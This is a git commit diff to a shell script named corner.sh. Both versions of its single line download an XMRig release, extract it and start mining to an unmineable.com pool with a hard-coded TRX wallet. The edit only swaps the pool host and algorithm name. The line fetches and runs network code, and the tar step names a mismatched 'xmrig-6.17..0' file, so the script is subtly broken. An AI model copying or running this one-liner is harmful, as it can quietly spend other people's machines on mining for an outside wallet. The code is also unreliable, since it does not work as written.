bca98151fb3bdc3793a27bb1518e4c2acedeb0b3
rahman33 <onggenk33.sjf@gmail.com>
2023-10-22 14:40:40 -0600

    Update corner.sh

--- corner.sh
+++ corner.sh
@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz && tar -xvf xmrig-6.17..0 && ./xmrig -o rx.unminiable.com:3333 -a rx -k -u TRX:TNyy6dLgz11FjuZdzXbZM5T3vrHzMrqRVD.01 -p x
+wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz && tar -xvf xmrig-6.17..0 && ./xmrig -o rx-us.unmineable.com -a randomx -k -u TRX:TNyy6dLgz11FjuZdzXbZM5T3vrHzMrqRVD.01 -p x
